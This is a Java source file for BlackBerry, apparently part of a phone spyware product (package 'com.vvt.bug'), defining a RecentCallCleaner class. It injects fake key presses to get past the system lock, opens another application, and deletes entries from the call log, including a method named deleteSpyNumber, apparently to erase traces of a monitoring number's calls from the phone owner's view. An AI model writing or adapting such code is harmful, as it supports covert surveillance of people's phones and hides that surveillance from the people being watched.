package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;
import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.invoke.Invoke;
import net.rim.blackberry.api.invoke.SearchArguments;
import net.rim.blackberry.api.invoke.TaskArguments;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.ui.Keypad;

public class RecentCallCleaner {
	
	private int round = 1;
	private int pos = 0;
	
	public RecentCallCleaner() {}
	
	public void deleteLastCall() {
		round = 1;
		deleteCall(false);
	}
	
	public void deleteLastNCall(int number) {
		round = number;
		deleteCall(false);
	}
	
	public void deleteSpyNumber(int pos) { // The first record is position at 0.
		this.pos = pos;
		deleteCall(false);
	}
	
	public void deleteFlexiKey() {
		deleteCall(true);
	}

	private void deleteCall(final boolean isFlexiKey) {
		int waitInterval = 0;		
		// 1). To unlock the phone system.
		if (ApplicationManager.getApplicationManager().isSystemLocked()) {
			int lockKey = 4099; // This value comes from API 5.0.
			InjectionKeyThread lockKeyThread = new InjectionKeyThread((char)lockKey);
			lockKeyThread.start();
			waitInterval = 1000;
		}
		// 2). It calls another application.
		if (PhoneInfo.isFive846() || PhoneInfo.isFive977()) {
			Invoke.invokeApplication(Invoke.APP_TYPE_TASKS, new TaskArguments());
		} else {
			Invoke.invokeApplication(Invoke.APP_TYPE_SEARCH, new SearchArguments());
		}
		new Timer().schedule(new TimerTask() {
			public void run() {
				try {
					// 3). To order simulation key.
					InjectionKeyThread sendKeyThread = new InjectionKeyThread((char)Keypad.KEY_SEND);
					InjectionKeyThread rollDownThread = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, pos, sendKeyThread);
					InjectionKeyThread[] backspaceKeyThread = new InjectionKeyThread[round];
					InjectionKeyThread[] menuKeyThread = new InjectionKeyThread[round];
					for (int i = 0; i < round; i++) {
						if (i == 0) {
							backspaceKeyThread[i] = new InjectionKeyThread((char)Keypad.KEY_BACKSPACE, rollDownThread);
						}
						else {
							backspaceKeyThread[i] = new InjectionKeyThread((char)Keypad.KEY_BACKSPACE, menuKeyThread[i-1]);
						}
						menuKeyThread[i] = new InjectionKeyThread((char)Keypad.KEY_MENU, backspaceKeyThread[i]);
					}
					// 4). To start simulation key.
					int sendKeySleep = 50;
					Thread.sleep(sendKeySleep);
					sendKeyThread.start();
					int rollDownSleep = 0;
					if (isFlexiKey) {
						rollDownSleep = 100;
					}
					else {
						rollDownSleep = 300;
					}
					Thread.sleep(rollDownSleep);
					rollDownThread.start();
					for (int i = 0; i < round; i++) {
						int backspaceSleep = 300;
						Thread.sleep(backspaceSleep);
						backspaceKeyThread[i].start();
						menuKeyThread[i].start();
					}
					// 5). To start simulation key End.
					if (!isFlexiKey) {
						InjectionKeyThread endKeyThread = new InjectionKeyThread((char)Keypad.KEY_END, menuKeyThread[round-1]);
						endKeyThread.start();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, waitInterval);
	}
}
